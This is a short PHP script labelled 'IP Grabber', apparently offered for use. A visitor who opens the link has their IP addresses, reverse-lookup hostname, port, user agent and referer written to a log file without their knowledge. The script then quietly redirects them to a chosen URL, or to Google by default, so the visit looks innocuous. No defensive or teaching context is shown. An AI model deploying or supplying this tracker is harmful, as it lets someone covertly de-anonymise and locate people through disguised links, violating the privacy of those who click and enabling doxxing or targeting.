<?php
 
//IP Grabber
 
//Variables
$redirection_url = file_get_contents("redirect_url.txt"); // Get the link
$heure_connexion = date("Y-m-d H:i:s");
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$ip1 = $_SERVER['HTTP_CLIENT_IP'];
$ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('log.txt', 'a');
fwrite($fh, '[ Connection Time: '."".$heure_connexion ."\n");
fwrite($fh, 'IP Address 0: '."".$ip ."\n");
fwrite($fh, 'IP Address 1:'."".$ip1 ."\n");
fwrite($fh, 'IP Address (IPV4):'."".$ip2 ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ." ]\n\n");
fclose($fh);

if (!empty($redirection_url)) {
    header("Location: " . $redirection_url);
    exit();
} else {
    // If the url is empty redirecting to google :
    header("Location: https://www.google.com");
    exit();
}

?>